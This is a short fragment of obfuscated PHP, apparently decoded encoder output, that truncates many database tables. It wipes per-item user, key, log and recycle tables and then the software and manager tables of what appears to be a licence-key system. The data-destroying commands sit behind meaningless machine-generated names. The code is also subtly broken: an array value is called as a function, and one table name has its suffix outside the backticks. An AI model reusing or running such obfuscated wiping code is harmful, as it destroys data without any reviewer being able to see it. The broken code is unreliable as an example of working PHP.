        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
}

?>
